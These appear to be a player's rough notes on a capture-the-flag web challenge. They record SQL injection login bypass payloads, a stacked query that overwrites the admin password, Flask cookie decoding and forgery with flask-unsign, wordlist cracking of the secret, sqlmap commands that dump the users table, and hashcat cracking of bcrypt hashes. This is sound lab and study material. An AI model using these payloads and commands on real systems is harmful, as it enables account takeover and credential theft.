# Web 3 - Horror Feeds

```python
# database.login and database.register look like they are vulnerable to sqli
# app uses mariadb/MySQL

# registered user barrett:password
```

```sql
-- https://github.com/payloadbox/sql-injection-payload-list
-- https://mariadb.com/kb/en/sleep/

-- SELECT password FROM users WHERE username = %s

-- ' or 1=1 limit 1


/*
check cookie for username, I think we can read /flag.txt and server will put in cookie
barrett:password

eyJhdXRoIjoiZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SjFjMlZ5Ym1GdFpTSTZJbUpoY25KbGRIUWlMQ0psZUhBaU9qRTJOalkyTkRVd016bDkuRERsYklCSzJESllLZzhfdDB2Y2twcTJQRlp1TWYzSTA0ajlWX3d6dk5RMCJ9.Y1anzw.QqzEiVPSH56gxz7OQ5wJdRs7ZGw

utils.py - generate_token() => jwt
https://jwt.io/
*/


-- actually overthinking this
-- dashboard.html will show flag is authenticated as 'admin'

-- user: admin
-- password: ' and 1=2
-- conflict...
```

```sh
# can we unsign the cookie ?

sudo -H pip3 install flask-unsign

flask-unsign --decode --cookie 'eyJhdXRoIjoiZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SjFjMlZ5Ym1GdFpTSTZJbUpoY25KbGRIUWlMQ0psZUhBaU9qRTJOalkyTkRVd016bDkuRERsYklCSzJESllLZzhfdDB2Y2twcTJQRlp1TWYzSTA0ajlWX3d6dk5RMCJ9.Y1anzw.QqzEiVPSH56gxz7OQ5wJdRs7ZGw'

{'auth': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImJhcnJldHQiLCJleHAiOjE2NjY2NDUwMzl9.DDlbIBK2DJYKg8_t0vckpq2PFZuMf3I04j9V_wzvNQ0'}


flask-unsign --wordlist /usr/share/wordlists/rockyou.txt --unsign --cookie 'eyJhdXRoIjoiZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SjFjMlZ5Ym1GdFpTSTZJbUpoY25KbGRIUWlMQ0psZUhBaU9qRTJOalkyTkRVd016bDkuRERsYklCSzJESllLZzhfdDB2Y2twcTJQRlp1TWYzSTA0ajlWX3d6dk5RMCJ9.Y1anzw.QqzEiVPSH56gxz7OQ5wJdRs7ZGw' --no-literal-eval

flask-unsign --unsign --server http://0.0.0.0:1337

# ohhh...
# cookie['auth'] = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImJhcnJldHQiLCJleHAiOjE2NjY2NDUwMzl9.DDlbIBK2DJYKg8_t0vckpq2PFZuMf3I04j9V_wzvNQ0'

when decoded:
{
  "username": "barrett",
  "exp": 1666645039
}

made new one with admin
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjY2NjQ1MDM5fQ.YnGv0P2cHsonToe_1CDEl6903H__PVrGU6Mvj7jpfRo

edited session, added this

still missing secret key though...

```

```sh
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev

python3 sqlmap.py -u 'http://0.0.0.0:1337/api/login' --level 5 --risk 3 -f --banner --ignore-code 401 --dbms='mysql' --technique=B

python3 ~/Downloads/sqlmap-dev/sqlmap.py -r sqlreq.txt --level 5 --risk 3 -f --banner --ignore-code 401 --dbms='mysql' --technique=B
```

```sh

# user: ' union select password from users where username='admin'
# password: test

# submitted...login and check new cookie

.eJwljV1vgjAYRv8LP8CU8pG4u9kJfZtRoxMq3Bj6gpQVDJu6pVv234fx8jznSc6vV9-uxnvyWieMTrHf9ALyH_BlDxc47yJkEIOdDgUTy8V88pEWTo_JtXqbRY9do6JJ07Cb90ulJAG-MhjIQAfCQlo5TUnXHOSA56xrqBlwzB88RkarfCloYrUabsLNwbEI78FsX1L5XvrZ_vl7w8mCvKz1Nj5OIUvJB41PvLbtK1tj7Y7JipfVp4IvVnDZWvT-_gHVHEVM.Y1a_IA.3re3SL6GWSF5Ga1BGkkmfYdChsg

flask-unsign --decode --cookie '.eJwljV1vgjAYRv8LP8CU8pG4u9kJfZtRoxMq3Bj6gpQVDJu6pVv234fx8jznSc6vV9-uxnvyWieMTrHf9ALyH_BlDxc47yJkEIOdDgUTy8V88pEWTo_JtXqbRY9do6JJ07Cb90ulJAG-MhjIQAfCQlo5TUnXHOSA56xrqBlwzB88RkarfCloYrUabsLNwbEI78FsX1L5XvrZ_vl7w8mCvKz1Nj5OIUvJB41PvLbtK1tj7Y7JipfVp4IvVnDZWvT-_gHVHEVM.Y1a_IA.3re3SL6GWSF5Ga1BGkkmfYdChsg'

{'auth': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IicgdW5pb24gc2VsZWN0IHBhc3N3b3JkIGZyb20gdXNlcnMgd2hlcmUgdXNlcm5hbWU9J2FkbWluJyIsImV4cCI6MTY2NjY1MTAwOH0.0DEbQ6_p4CG0q26fHakeLCEcay_FBHYZrWIvCVHNekc'}

#nope
```


```sh
user: ' union select password from users where username='admin'

' union SELECT password FROM user where  union '','',"FAIL"
# nope


# '; update users set password=(select password from users where username='barrett') where username='admin'--

# interesting... admin:password returns invalid salt ?


# example of bcrypt hash
$2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy
      |<---    salt     --->||<---- confirmation hash ---->|


# error spill hash, admin? who's is it?
'; select password from user where user='barrett' union select "FAIL"
$2b$12$GCx5Qt5XzHe10w3i1vRt/.VAyasOSj9D596MwfCFzA8QWNO6FkfYy
      |<---    salt     --->||<---- confirmation hash ---->|
alg $2b$
cost 12
salt $GCx5Qt5XzHe10w3i1vRt/.
hash VAyasOSj9D596MwfCFzA8QWNO6FkfYy

'; select password from user where user='admin' union select "FAIL"
$2b$12$PxIH/23SntqZ2EeHN14c7uZgEvjSN2/2.owJbCEzJcpyHeHBMT3RW

# admin hash in entrypoint.sh
$2a$12$BHVtAvXDP1xgjkGEoeqRTu2y4mycnpd6If0j/WbP0PCjwW4CKdq6G
      |                     ||                             |

# https://en.bitcoinwiki.org/wiki/Bcrypt#Versioning_History
admin hash is $2a ... user hash $2b ?

# ran on windows
hashcat.exe -a 0 -m 3200 hash.txt rockyou.txt

```

```sh
python3 ~/Downloads/sqlmap-dev/sqlmap.py -r sqlreq.txt --dbs --dbms=MySQL -v 3 --batch -D horror_feeds -T users --dump
```
